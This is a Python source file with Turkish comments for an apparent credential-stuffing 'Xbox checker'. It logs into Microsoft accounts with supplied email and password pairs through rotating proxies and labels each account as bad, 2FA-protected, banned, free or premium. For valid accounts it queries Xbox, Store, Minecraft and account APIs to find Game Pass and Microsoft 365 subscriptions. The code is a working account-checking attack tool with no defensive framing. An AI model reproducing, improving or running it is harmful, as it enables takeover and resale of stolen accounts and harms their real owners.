import re
import time
import json
import random
from threading import Lock
from urllib.parse import urlparse, parse_qs, unquote
import requests
import urllib3

urllib3.disable_warnings()

# ===================== ABONELİK TÜRLERİ =====================
SUB_TYPES = [
    'xbox game pass ultimate',
    'xbox game pass core',
    'pc game pass',
    'game pass console',
    'xbox live gold',
    'ea play',
    'microsoft 365',
    'office 365',
    'onedrive',
    'copilot pro',
    'game pass'
]

# ===================== PROXY MANAGER =====================
class ProxyManager:
    def __init__(self, proxy_list=None):
        self.proxies = proxy_list or []
        self._lock = Lock()
        self.bad_proxies = set()
        self.fail_count = {}

    def has_proxies(self):
        return bool(self.proxies)

    def get(self):
        if not self.proxies:
            return None
        with self._lock:
            self.proxies = [p for p in self.proxies if p not in self.bad_proxies]
            if not self.proxies:
                return None
            p = random.choice(self.proxies)
        parts = p.split(':')
        if len(parts) >= 4:
            s = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            s = f"http://{parts[0]}:{parts[1]}"
        else:
            s = f"http://{p}"
        return {"http": s, "https": s}
    
    def mark_bad(self, proxy_str):
        with self._lock:
            self.bad_proxies.add(proxy_str)

# ===================== XBOX CHECKER =====================
class XboxChecker:
    LOGIN_URL = (
        "https://login.live.com/oauth20_authorize.srf"
        "?client_id=00000000402B5328"
        "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
        "&scope=service::user.auth.xboxlive.com::MBI_SSL"
        "&display=touch&response_type=token&locale=en"
    )

    def __init__(self, proxy_manager=None):
        self.proxy_manager = proxy_manager

    def _session(self):
        s = requests.Session()
        s.verify = False
        s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
        if self.proxy_manager:
            proxy = self.proxy_manager.get()
            if proxy:
                s.proxies.update(proxy)
        return s

    def _extract_token(self, url):
        fragment = urlparse(url).fragment
        if not fragment and '#' in url:
            fragment = url.split('#', 1)[1]
        params = parse_qs(fragment)
        return params.get('access_token', [None])[0]

    def _detect_subscription(self, text):
        if not text:
            return None
        text_lower = text.lower()
        for sub in SUB_TYPES:
            if sub in text_lower:
                return sub.upper()
        return None

    def check(self, email, password):
        start_time = time.time()
        try:
            session = self._session()
            
            # === ADIM 1: LOGIN ===
            r1 = session.get(self.LOGIN_URL, timeout=(10, 15))
            sftag_m = re.search(r'value=\\"(.+?)\\"', r1.text)
            url_post_m = re.search(r'"urlPost":"(.+?)"', r1.text)
            
            if not sftag_m or not url_post_m:
                return {"status": "ERROR", "duration": time.time() - start_time}
            
            sftag = sftag_m.group(1)
            url_post = url_post_m.group(1)

            r2 = session.post(
                url_post,
                data={
                    'login': email,
                    'loginfmt': email,
                    'passwd': password,
                    'PPFT': sftag,
                    'type': '11',
                    'LoginOptions': '1'
                },
                timeout=(10, 15),
                allow_redirects=True
            )

            ms_token = None

            # === ADIM 2: TOKEN KONTROLÜ ===
            if 'access_token' in r2.url:
                ms_token = self._extract_token(r2.url)
            else:
                r2_lower = r2.text.lower()
                
                if ('incorrect' in r2_lower or 'invalid' in r2_lower or 
                    "doesn't exist" in r2_lower or 'account doesn' in r2_lower or
                    re.search(r'sErrorCode.*?"50126"', r2.text)):
                    return {"status": "BAD", "duration": time.time() - start_time}

                if ('identity/confirm' in r2.url or 'two-step' in r2_lower or 
                    'verify your identity' in r2_lower):
                    return {"status": "2FA", "duration": time.time() - start_time}

                if '/Abuse' in r2.url or 'suspended' in r2_lower:
                    return {"status": "BANNED", "duration": time.time() - start_time}

                form_action_m = re.search(r'<form[^>]*action="([^"]+)"', r2.text)
                if form_action_m:
                    action = form_action_m.group(1)
                    hidden = {}
                    for m in re.finditer(r'<input[^>]+>', r2.text, re.I):
                        inp = m.group()
                        if 'hidden' in inp.lower():
                            n = re.search(r'name="([^"]+)"', inp)
                            v = re.search(r'value="([^"]*)"', inp)
                            if n:
                                hidden[n.group(1)] = v.group(1) if v else ''
                    
                    r3 = session.post(action, data=hidden, timeout=(10, 15), allow_redirects=True)
                    if 'access_token' in r3.url:
                        ms_token = self._extract_token(r3.url)
                    else:
                        ru_m = re.search(r'ru=([^&"\'>\s]+)', action)
                        if not ru_m:
                            ru_m = re.search(r'ru=([^&"\'>\s]+)', r3.url)
                        if ru_m:
                            ru = unquote(ru_m.group(1))
                            r4 = session.get(ru, timeout=(10, 15), allow_redirects=True)
                            if 'access_token' in r4.url:
                                ms_token = self._extract_token(r4.url)

                if not ms_token:
                    return {"status": "BAD", "duration": time.time() - start_time}

            if not ms_token:
                return {"status": "BAD", "duration": time.time() - start_time}

            # === ADIM 3: XBOX AUTH ===
            r_xbl = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json={
                    "Properties": {
                        "AuthMethod": "RPS",
                        "SiteName": "user.auth.xboxlive.com",
                        "RpsTicket": ms_token
                    },
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT"
                },
                timeout=(10, 15)
            )
            
            if r_xbl.status_code != 200:
                return {"status": "FREE", "data": {}, "duration": time.time() - start_time}
            
            xbl_data = r_xbl.json()
            xbl_token = xbl_data['Token']
            uhs = xbl_data['DisplayClaims']['xui'][0]['uhs']

            # === ADIM 4: XSTS AUTH ===
            r_xsts = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json={
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                    "RelyingParty": "http://xboxlive.com",
                    "TokenType": "JWT"
                },
                timeout=(10, 15)
            )
            
            gamertag = ""
            gamerscore = 0
            gamepass_type = None
            subscription_details = []
            
            if r_xsts.status_code == 401:
                xerr = r_xsts.json().get('XErr', 0) if r_xsts.text.startswith('{') else 0
                if xerr == 2148916229:
                    return {"status": "BANNED", "duration": time.time() - start_time}
            
            if r_xsts.status_code == 200:
                xsts_token = r_xsts.json()['Token']
                xbl_auth = f"XBL3.0 x={uhs};{xsts_token}"
                
                # === PROFİL ===
                r_prof = session.get(
                    "https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,Gamerscore",
                    headers={
                        "Authorization": xbl_auth,
                        "x-xbl-contract-version": "2",
                        "Accept": "application/json"
                    },
                    timeout=(10, 15)
                )
                if r_prof.status_code == 200:
                    settings = r_prof.json().get('profileUsers', [{}])[0].get('settings', [])
                    for s in settings:
                        if s.get('id') == 'Gamertag':
                            gamertag = s.get('value', '')
                        elif s.get('id') == 'Gamerscore':
                            try:
                                gamerscore = int(s.get('value', 0))
                            except:
                                pass

                # === KONTROL 1: Xbox Subscriptions ===
                try:
                    sub_url = "https://subscriptions.xboxlive.com/users/me/subscriptions"
                    sub_headers = {
                        'Authorization': xbl_auth,
                        'Accept': 'application/json',
                        'x-xbl-contract-version': '2'
                    }
                    r_sub = session.get(sub_url, headers=sub_headers, timeout=(10, 15))
                    if r_sub.status_code == 200:
                        sub_data = r_sub.json()
                        for sub in sub_data.get('subscriptions', []):
                            name = sub.get('name', '')
                            state = sub.get('state', '')
                            sub_type = self._detect_subscription(name)
                            if sub_type:
                                subscription_details.append(f"{sub_type}")
                                if state.lower() == 'active':
                                    gamepass_type = sub_type
                                    break
                except:
                    pass

                # === KONTROL 2: Xbox Store ===
                if not gamepass_type:
                    try:
                        store_url = "https://storeedgefd.dsx.mp.microsoft.com/v9.0/users/me/purchases"
                        store_headers = {
                            'Authorization': xbl_auth,
                            'Accept': 'application/json'
                        }
                        r_store = session.get(store_url, headers=store_headers, timeout=(10, 15))
                        if r_store.status_code == 200:
                            store_data = r_store.json()
                            for item in store_data.get('items', []):
                                name = item.get('name', '')
                                sub_type = self._detect_subscription(name)
                                if sub_type:
                                    subscription_details.append(f"{sub_type}")
                                    gamepass_type = sub_type
                                    break
                    except:
                        pass

                # === KONTROL 3: Minecraft API ===
                if not gamepass_type:
                    try:
                        r_mc_xsts = session.post(
                            'https://xsts.auth.xboxlive.com/xsts/authorize',
                            json={
                                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_token]},
                                "RelyingParty": "rp://api.minecraftservices.com/",
                                "TokenType": "JWT"
                            },
                            timeout=(10, 15)
                        )
                        if r_mc_xsts.status_code == 200:
                            mc_xsts_token = r_mc_xsts.json()['Token']
                            r_mc_auth = session.post(
                                'https://api.minecraftservices.com/authentication/login_with_xbox',
                                json={'identityToken': f"XBL3.0 x={uhs};{mc_xsts_token}"},
                                timeout=(10, 15)
                            )
                            if r_mc_auth.status_code == 200:
                                mc_token = r_mc_auth.json().get('access_token', '')
                                r_ent = session.get(
                                    'https://api.minecraftservices.com/entitlements/mcstore',
                                    headers={'Authorization': f"Bearer {mc_token}"},
                                    timeout=(10, 15)
                                )
                                if r_ent.status_code == 200:
                                    ent_text = r_ent.text.lower()
                                    if 'product_game_pass_ultimate' in ent_text:
                                        gamepass_type = 'GAME PASS ULTIMATE'
                                    elif 'product_game_pass_pc' in ent_text:
                                        gamepass_type = 'PC GAME PASS'
                                    elif 'product_game_pass_extra' in ent_text:
                                        gamepass_type = 'GAME PASS EXTRA'
                                    elif 'product_game_pass_premium' in ent_text:
                                        gamepass_type = 'GAME PASS PREMIUM'
                                    elif 'product_game_pass_core' in ent_text or 'xbox_live_gold' in ent_text:
                                        gamepass_type = 'GAME PASS CORE'
                                    elif 'product_game_pass' in ent_text:
                                        gamepass_type = 'GAME PASS'
                    except:
                        pass

                # === KONTROL 4: Microsoft Account ===
                if not gamepass_type:
                    try:
                        acc_url = "https://account.microsoft.com/api/user"
                        acc_headers = {
                            'Authorization': xbl_auth,
                            'Accept': 'application/json'
                        }
                        r_acc = session.get(acc_url, headers=acc_headers, timeout=(10, 15))
                        if r_acc.status_code == 200:
                            acc_data = r_acc.json()
                            services = acc_data.get('services', {})
                            for svc_name, svc_data in services.items():
                                if 'subscription' in svc_name.lower() or 'pass' in svc_name.lower():
                                    sub_type = self._detect_subscription(svc_name)
                                    if sub_type:
                                        subscription_details.append(f"{sub_type}")
                                        gamepass_type = sub_type
                                        break
                    except:
                        pass

            # === SONUÇ ===
            data = {
                "gamertag": gamertag,
                "gamerscore": gamerscore,
                "subscriptions": list(set(subscription_details)) if subscription_details else []
            }
            
            if gamepass_type:
                data['gamepass'] = gamepass_type
                return {
                    "status": "PREMIUM",
                    "data": data,
                    "duration": time.time() - start_time
                }
            else:
                return {
                    "status": "FREE",
                    "data": data,
                    "duration": time.time() - start_time
                }

        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT", "duration": time.time() - start_time}
        except Exception as e:
            return {"status": "ERROR", "duration": time.time() - start_time}
